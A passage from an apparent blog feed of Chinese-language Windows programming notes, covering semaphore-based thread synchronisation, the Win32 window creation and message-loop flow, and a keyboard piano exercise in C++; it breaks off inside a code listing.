初始化的锁的个数当前的信号数量</span></span><br><span class="line"><span class="comment">// 参数3： 锁的最大个数       最多能够拥有多少信号</span></span><br><span class="line"><span class="comment">// 参数4： 名字</span></span><br><span class="line"><span class="comment">// 【当信号的数量为0的时候，表示所有的锁都锁上了】</span></span><br><span class="line">HANDLE Semaphore = CreateSemaphore(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量，同时被多个线程访问</span></span><br><span class="line"><span class="keyword">long</span> Number = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数1</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadA</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 上一把锁   拥有的信号数  -1</span></span><br><span class="line">WaitForSingleObject(Semaphore, INFINITE);</span><br><span class="line">Number++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数1： 需要对哪一个信号量操作</span></span><br><span class="line"><span class="comment">// 参数2： 解多少把锁   信号+   </span></span><br><span class="line"><span class="comment">// 参数3： 解锁前的，锁的个数</span></span><br><span class="line">LONG Count = <span class="number">0</span>;</span><br><span class="line">ReleaseSemaphore(Semaphore, <span class="number">1</span>, &amp;Count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数2</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThreadB</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 将全局变量 Number 自增十万次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(Semaphore, INFINITE);</span><br><span class="line">Number++;</span><br><span class="line">LONG Count = <span class="number">0</span>;</span><br><span class="line">ReleaseSemaphore(Semaphore, <span class="number">1</span>, &amp;Count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadA, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WorkerThreadB, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待两个线程同时执行结束</span></span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows编程 </tag>
            
            <tag> 进程 </tag>
            
            <tag> 线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows编程————SDK</title>
      <link href="2020/12/05/windows%E7%BC%96%E7%A8%8B/"/>
      <url>2020/12/05/windows%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Windows窗口的创建流程"><a href="#一、Windows窗口的创建流程" class="headerlink" title="一、Windows窗口的创建流程"></a>一、Windows窗口的创建流程</h1><h2 id="注册一个窗口类"><a href="#注册一个窗口类" class="headerlink" title="注册一个窗口类"></a>注册一个窗口类</h2><p>RegisterClass</p><p>1.1、提供一个消息处理函数（窗口回调函数）</p><p>1.2、提供一个窗口类的名字</p><h2 id="创建一个窗口"><a href="#创建一个窗口" class="headerlink" title="创建一个窗口"></a>创建一个窗口</h2><p>​    GreateWindow 能够创建一个窗口，得到一个窗口句柄，是系统找到串口的一个标识</p><h2 id="更新显示窗口"><a href="#更新显示窗口" class="headerlink" title="更新显示窗口"></a>更新显示窗口</h2><p>UpdateWindow（更新）</p><p>Show Window（显示）</p><h2 id="编写一个消息循环"><a href="#编写一个消息循环" class="headerlink" title="编写一个消息循环"></a>编写一个消息循环</h2><p>​       While(GetMessage)(…))</p><p>​           {</p><p>​              TranslateMessage();</p><p>​              DispatchMessage(…);</p><p>}</p><h2 id="编写一个消息处理函数（窗口回调函数）"><a href="#编写一个消息处理函数（窗口回调函数）" class="headerlink" title="编写一个消息处理函数（窗口回调函数）"></a>编写一个消息处理函数（窗口回调函数）</h2><p>​    DWORD WINAPI WndProc(HWND hWnd,int nMessage,WPARAM wParam,LPARAM lParam)</p><p>{</p><p>​    Switch(message)</p><p>​    {</p><p>}</p><p>}</p><p>问题1：怎么理解这一些代码，这个过程这段代码，是定形式，是微软规定好的流程</p><p>问题2：消息是怎么获取到的</p><p>只有窗口才能够收消息，窗口收的息，需要通过 GetMessage来从程序的消息队列中获取到。你需要创建一个窗口，然后在创建窗口之后就可以使用 GetMessage获得创建的窗口收到的消息</p><p>问题3：消息队列在哪里，我为什么看不到？？</p><p>因为大部分的事情都是操作系统帮你完成了比如说消息队列，比如往消息队列添加消息，从消息队列中得到消息，删除已经得到的问题4：什么是回调函数？谁调用了回调函数？教育</p><p>回调函数就不是你调用的函数你提供了一个函数给操作系统，操作系统在合适的时机去调用你提供的函数。因为只有操作系统才能知道什么时候得到了消息，只有我才知道我的程序怎么处理消息</p><p>问题5：为什么创建窗口要先注册窗口类？为什么创建完窗口要写更新显示窗口？为什么消息循环要写 tMessage DispatchMessage并放在一个循环里面？？需要先有一个板（窗口共有一些特性，放在窗口类里面），然后创建窗口的时候根据模板去创建</p><p>刚创建出来的窗口是隐藏起来的，比如 ShowWindow给显示出来， UpdateWindow能够让窗口产生一次自绘（WMPAINT）</p><p>的作用就是从滴息队列中获取消息</p><p> DispatchMessage的作用就是调用口相对应的回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//用于在调试窗口输出信息</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">trace</span><span class="params">(CONST TCHAR* format, ...)</span><span class="comment">//变参函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line">va_start(argptr,format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定缓冲区</span></span><br><span class="line">wvsprintf(buffer, format, argptr);</span><br><span class="line">va_end(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line">OutputDebugString(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//必须提供窗口回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND hWnd,<span class="comment">//哪个串口的消息</span></span></span></span><br><span class="line"><span class="function"><span class="params">UINT uMsg,<span class="comment">//消息的类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">LPARAM lParam<span class="comment">//消息的附加参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//使用分支语句处理要操作的消息</span></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:<span class="comment">//窗口创建消息，第一个被产生 的消息</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(hWnd, <span class="string">L&quot;打开成功&quot;</span>, <span class="string">L&quot;标题&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//右上角关闭按钮</span></span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(hWnd, <span class="string">L&quot;确认是否关闭&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"><span class="comment">//销毁当前窗口</span></span><br><span class="line">DestroyWindow(hWnd);</span><br><span class="line"><span class="comment">//结束消息循环</span></span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//窗口移动消息，移动窗口位置响应</span></span><br><span class="line"><span class="keyword">case</span> WM_MOVE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//lParam保存左上角坐标</span></span><br><span class="line">WORD x = LOWORD(lParam);</span><br><span class="line">WORD y = HIWORD(lParam);</span><br><span class="line">trace(<span class="string">L&quot;POS(%d,%d)\n&quot;</span>, x, y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd,uMsg,wParam,lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">trace(<span class="string">L&quot;一次调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ HINSTANCE hInstance,<span class="comment">//实例句柄，表示当前应用程序，用于获取资源</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_ HINSTANCE hPrevInstance,<span class="comment">//句柄，标识上一个打开的应用程序</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_opt_ LPSTR lpCmdLine,<span class="comment">//命令行参数，对应的是main函数的argv参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">_In_ <span class="keyword">int</span> nCmdShow<span class="comment">//显示方式，最大化最小化</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">prin();</span><br><span class="line"><span class="comment">//1、创建窗口类，</span></span><br><span class="line">WNDCLASS WnsClass = &#123;<span class="number">0</span>&#125;;<span class="comment">//窗口结构体初始化为0</span></span><br><span class="line">WnsClass.lpfnWndProc = WndProc;<span class="comment">//一个回调函数的地址</span></span><br><span class="line">WnsClass.lpszClassName = <span class="string">L&quot;myclass&quot;</span>;<span class="comment">//结构体名字，表示当前的窗口，由于是宽字符</span></span><br><span class="line">WnsClass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">//使用默认光标</span></span><br><span class="line">WnsClass.style = CS_VREDRAW | CS_HREDRAW;<span class="comment">//窗口改变大小后重绘制</span></span><br><span class="line">WnsClass.hInstance = hInstance;<span class="comment">//标识当前应用程序</span></span><br><span class="line">WnsClass.hIcon = LoadIcon(<span class="literal">NULL</span>,IDI_APPLICATION);<span class="comment">//使用默认图标</span></span><br><span class="line">WnsClass.hbrBackground = CreateSolidBrush(RGB(<span class="number">0</span>, <span class="number">0xff</span>, <span class="number">0</span>));<span class="comment">//背景颜色</span></span><br><span class="line">WnsClass.cbWndExtra = WnsClass.cbClsExtra = <span class="number">0</span>;<span class="comment">//扩展，几乎没有用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、注册已经注册好的窗口，注册后的窗口才能使用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == RegisterClass(&amp;WnsClass))<span class="comment">//传入需要注册的结构体地址</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;打开失败&quot;</span>, <span class="string">L&quot;错误&quot;</span>, MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3通过设置好的窗口来创建</span></span><br><span class="line">HWND hWnd=CreateWindow(<span class="comment">//返回值是一个窗口句柄</span></span><br><span class="line"><span class="string">L&quot;myclass&quot;</span>,<span class="comment">//使用注册好的窗口类</span></span><br><span class="line"><span class="string">L&quot;第一个窗口&quot;</span>,<span class="comment">//窗口的显示名称</span></span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">//窗口显示类型：重叠窗口</span></span><br><span class="line">CW_USEDEFAULT, <span class="number">0</span>,<span class="comment">//窗口左上角的坐标，使用CW_USEDEFAULT,可以省略y</span></span><br><span class="line">CW_USEDEFAULT, <span class="number">0</span>,<span class="comment">//窗口的高度和宽度，使用CW_USEDEFAULT，可以省略宽度</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//当前的窗口的副窗口</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//菜单句柄，标识当前使用哪个菜单</span></span><br><span class="line">hInstance,<span class="comment">//实例句柄，表示当前窗口属于哪个应用程序</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4、显示并更新窗口</span></span><br><span class="line">ShowWindow(hWnd, SW_SHOWNORMAL);<span class="comment">//默认不显示，所以，我们需要手动显示</span></span><br><span class="line">UpdateWindow(hWnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//5、编写消息循环</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;<span class="comment">//保存消息的结构体</span></span><br><span class="line"><span class="keyword">while</span> (GetMessage(</span><br><span class="line">&amp;msg,<span class="comment">//保存信息来源的结构体</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//窗口句柄，指定当前接收哪个窗口的消息，NULL表示所有</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>))<span class="comment">//表示想要接收消息的范围0，表示所有</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将消息结构体中的前四个参数传递给对应窗口类中填写 的回调函数</span></span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二、练习题"><a href="#二、练习题" class="headerlink" title="二、练习题"></a>二、练习题</h1><h2 id="题：钢琴"><a href="#题：钢琴" class="headerlink" title="题：钢琴"></a>题：钢琴</h2><p>描述：使用所提供的音乐资源写出可以根据按键弹奏播放对应的曲调</p><p>进阶：本地提供一个钢琴谱，根据琴谱自动弹奏</p><h3 id="main-cpp-主函数"><a href="#main-cpp-主函数" class="headerlink" title="main.cpp//主函数"></a>main.cpp//主函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Data.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;winmm.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">//用宏自定义消息类型</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UM_MYMESSAGE WM_USER+1</span></span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">en_zch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//设置英文输入法</span></span><br><span class="line">keybd_event(VK_SHIFT, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">Sleep(<span class="number">100</span>);</span><br><span class="line">keybd_event(VK_SHIFT, <span class="number">0</span>, KEYEVENTF_KEYUP, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPronstance, LPSTR lpCmdLine,<span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//注册窗口</span></span><br><span class="line">WNDCLASS ws = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">ws.lpfnWndProc= WndProc;</span><br><span class="line">ws.hInstance=hInstance;</span><br><span class="line">ws.lpszClassName = <span class="string">L&quot;piano&quot;</span>;</span><br><span class="line">RegisterClass(&amp;ws);</span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd=CreateWindow(<span class="string">L&quot;piano&quot;</span>, <span class="string">L&quot;钢琴&quot;</span>, WS_OVERLAPPEDWINDOW , <span class="number">500</span>, <span class="number">500</span>, <span class="number">800</span>, <span class="number">800</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//更新显示窗口</span></span><br><span class="line">UpdateWindow(hwnd);</span><br><span class="line">ShowWindow(hwnd,SW_SHOWNORMAL);</span><br><span class="line"><span class="comment">//消息泵</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//必须提供窗口回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND hWnd,<span class="comment">//哪个串口的消息</span></span></span></span><br><span class="line"><span class="function"><span class="params">UINT uMsg,<span class="comment">//消息的类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">WPARAM wParam,<span class="comment">//虚拟键值</span></span></span></span><br><span class="line"><span class="function"><span class="params">LPARAM lParam<span class="comment">//消息的附加参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建Data对象</span></span><br><span class="line">Data obj;</span><br><span class="line"><span class="comment">//使用分支语句处理要操作的消息</span></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;<span class="comment">//开场音乐</span></span><br><span class="line">PlaySoundA(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\LoopyMusic.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj.ReadData(hWnd))</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(hWnd, <span class="string">L&quot;检测到你有琴谱，是否播放&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK|MB_OKCANCEL);</span><br><span class="line">PostMessage(hWnd, UM_MYMESSAGE,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//给自定义消息发送</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自定义响应消息</span></span><br><span class="line"><span class="keyword">case</span> UM_MYMESSAGE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(Data::Souce); i++)</span><br><span class="line">&#123;</span><br><span class="line">obj.If_Case(Data::Souce[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//右上角关闭按钮</span></span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(hWnd, <span class="string">L&quot;是否退出钢琴&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"><span class="comment">//销毁当前窗口</span></span><br><span class="line">DestroyWindow(hWnd);</span><br><span class="line"><span class="comment">//结束消息循环</span></span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//按键按下响应</span></span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">&#123;</span><br><span class="line">obj.If_Case(wParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Data-h-数据类头文件，"><a href="#Data-h-数据类头文件，" class="headerlink" title="Data.h//数据类头文件，"></a>Data.h//数据类头文件，</h3><p>用于本地数据的读取及函数的封装</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//接收从本地读取到的字符</span></span><br><span class="line"><span class="keyword">char</span> <span class="keyword">static</span> Souce[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//判断传入的字符对应的播放音乐</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">If_Case</span><span class="params">(<span class="keyword">char</span> c_char)</span></span>;</span><br><span class="line"><span class="comment">//读取本地歌谱</span></span><br><span class="line"><span class="function">BOOL <span class="title">ReadData</span><span class="params">(HWND hwnd)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Data-cpp-数据类函数定义"><a href="#Data-cpp-数据类函数定义" class="headerlink" title="Data.cpp//数据类函数定义"></a>Data.cpp//数据类函数定义</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 